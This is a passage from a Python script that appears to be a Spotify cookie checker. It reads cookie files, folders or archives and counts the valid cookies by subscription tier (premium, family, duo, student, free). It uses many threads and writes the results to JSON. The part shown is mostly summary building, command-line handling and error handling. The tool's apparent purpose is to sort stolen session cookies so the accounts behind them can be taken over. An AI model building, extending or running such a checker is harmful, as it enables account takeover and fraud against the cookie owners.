                    debug_print("Using normal processing for small archive")
                    valid_cookies, errors = process_file(temp_file_path, os.path.basename(input_file))
                    messages = [msg for _, msg in valid_cookies] + errors
                    valid_cookies = [path for path, _ in valid_cookies]
            else:
                debug_print("Archive extraction failed")
                return create_error_summary("Failed to extract archive")
        else:
            # For regular files, use normal processing
            debug_print("Using normal processing for non-archive file")
            valid_cookies_tuples, errors = process_file(temp_file_path, os.path.basename(input_file))
            valid_cookies = [path for path, _ in valid_cookies_tuples]
            messages = [msg for _, msg in valid_cookies_tuples] + errors
        
        # Clean up
        if os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
                debug_print(f"Removed temporary file: {temp_file_path}")
            except Exception as e:
                debug_print(f"Error removing temp file: {e}")
                
        elapsed_time = time.time() - start_time
        debug_print(f"Cookie checking completed in {elapsed_time:.2f} seconds")
        
        # Generate summary
        summary = {
            "status": "completed",
            "total_checked": results['hits'] + results['bad'] + results['errors'],
            "valid": results['hits'],
            "invalid": results['bad'],
            "errors": results['errors'],
            "premium": results['premium'],
            "family": results['family'],
            "duo": results['duo'],
            "student": results['student'],
            "free": results['free'],
            "unknown": results['unknown'],
            "files_processed": results['files_processed'],
            "archives_processed": results['archives_processed'],
            "valid_cookies": valid_cookies,
            "messages": messages,
            "processing_time_seconds": elapsed_time,
            "checking_speed": (results['hits'] + results['bad'] + results['errors']) / elapsed_time if elapsed_time > 0 else 0
        }
        
        # Save summary to JSON
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        debug_print(f"Saving results to: {summary_path}")
        with open(summary_path, 'w') as f:
            json.dump(summary, f, indent=2)
        
        debug_print("Results saved successfully")
        return summary_path
        
    except Exception as e:
        error_msg = f"Error in check_cookies: {str(e)}\n{traceback.format_exc()}"
        debug_print(error_msg)
        
        # Create an error summary
        error_summary = {
            "status": "error",
            "error_message": str(e),
            "traceback": traceback.format_exc(),
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": results.get('files_processed', 0),
            "archives_processed": results.get('archives_processed', 0),
            "valid_cookies": [],
            "messages": [f"⚠ Processing error: {str(e)}"]
        }
        
        # Save error summary to JSON
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        return summary_path

if __name__ == "__main__":
    debug_print("Main program starting")
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Check Spotify cookies')
    parser.add_argument('input_file', nargs='?', help='File or directory to check')
    parser.add_argument('--all_cookies', action='store_true', help='Check all cookies in spotify directory')
    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
    args = parser.parse_args()
    
    # Validate and set thread count
    if args.threads < 1:
        args.threads = 1
    elif args.threads > MAX_THREADS:
        args.threads = MAX_THREADS
    
    debug_print(f"Using {args.threads} threads for processing")
    
    if args.all_cookies:
        # Check all cookies in the spotify directory
        debug_print("Checking all Spotify cookies...")
        print("Checking all Spotify cookies in the spotify directory...")
        
        if os.path.exists(SPOTIFY_DIR):
            check_cookies(SPOTIFY_DIR)
        else:
            error_msg = f"Error: Spotify directory not found at {SPOTIFY_DIR}"
            print(error_msg)
            debug_print(error_msg)
            sys.exit(1)
    elif args.input_file:
        # Check specified file or directory
        input_file = args.input_file
        debug_print(f"Input file argument: {input_file}")
        
        if not os.path.exists(input_file):
            error_msg = f"File not found: {input_file}"
            print(error_msg)
            debug_print(error_msg)
            sys.exit(1)
            
        check_cookies(input_file)
    else:
        print("Please provide a file/directory path as an argument or use --all_cookies")
        debug_print("No arguments provided")
        sys.exit(1)
        
        # Create an error file anyway to avoid hanging
        error_summary = {
            "status": "error",
            "error_message": error_msg,
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": 0,
            "archives_processed": 0,
            "valid_cookies": [],
            "messages": [f"⚠ {error_msg}"]
        }
        
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        print(f"Error results saved to: {summary_path}")
        sys.exit(1)
    
    try:
        # This section only runs when not using --all_cookies and when a valid input_file is provided
        if args.input_file:
            debug_print(f"Calling check_cookies with {args.input_file}")
            summary_path = check_cookies(args.input_file)
            print(f"Results saved to: {summary_path}")
            debug_print("Script completed successfully")
    except Exception as e:
        error_msg = f"Unhandled exception in main: {str(e)}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"ERROR: {str(e)}")
        
        # Create an error file anyway to avoid hanging
        error_summary = {
            "status": "error",
            "error_message": str(e),
            "traceback": traceback.format_exc(),
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": 0,
            "archives_processed": 0,
            "valid_cookies": [],
            "messages": [f"⚠ Unhandled error: {str(e)}"]
        }
        
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        print(f"Error results saved to: {summary_path}")
        sys.exit(1)